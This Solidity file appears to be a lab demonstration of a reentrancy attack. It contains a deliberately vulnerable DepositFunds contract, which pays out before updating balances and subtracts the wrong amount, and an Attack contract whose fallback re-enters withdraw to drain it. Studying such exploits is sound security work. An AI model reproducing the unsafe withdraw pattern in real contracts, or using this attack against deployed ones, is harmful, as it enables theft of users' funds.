// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.10;
import "hardhat/console.sol";
contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
       balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        uint bal = balances[msg.sender];
        console.log("Withdrawing 1 Ether");
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value:bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] -= amount;
    }
function getBalance() public view returns(uint256)
{
    return address(this).balance;
}

}
contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) public  {
        depositFunds = DepositFunds(_depositFundsAddress);
         
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw(1 ether);
        }
    }

    function attack() external payable {
       require(msg.value >= 1 ether);
       depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw(1 ether);
    }
function getBalance() public view returns(uint256)
{
    return address(this).balance;
}

}
